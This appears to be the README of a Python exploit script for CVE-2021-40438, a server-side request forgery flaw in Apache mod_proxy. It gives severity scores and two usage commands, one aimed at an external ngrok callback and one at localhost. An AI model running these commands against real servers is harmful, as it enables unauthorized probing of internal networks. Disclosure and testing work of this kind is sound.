# CVE-2021-40438 - Apache <= 2.4.48 - SSRF Python exploit
A crafted request uri-path can cause mod_proxy to forward the request to an origin server choosen by the remote user. This issue affects Apache HTTP Server 2.4.48 and earlier.

## CVSS v3.1:

Base Score: 9.0
Severity: CRITICAL
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H

Attack Vector: Network
Attack Complexity: High
Privileges Required: None
User Interaction: None
Scope: Changed
Confidentiality: High
Integrity: High
Availability: High

## Description

Vulnerability category: Server-side request forgery (SSRF)

This script uses the requests library to perform the HTTP GET request with the provided URLs. You can run the script from the command line, specifying the -t and -ssrf options to customise the URLs.

## Example of use:

You can use ngrok as a local webhook instead of open your local ports or use a public webhook from the internet.

```
python3 CVE-2021-40438.py -t https://target.com -ssrf https://cf92-88-26-100-207.ngrok-free.app/ssrf

python3 CVE-2021-40438.py -t https://target.com -ssrf http://127.0.0.1
```

## Requirements

Make sure you have the requests library installed before running the script. You can install it with the following command:

```
pip install requests
```
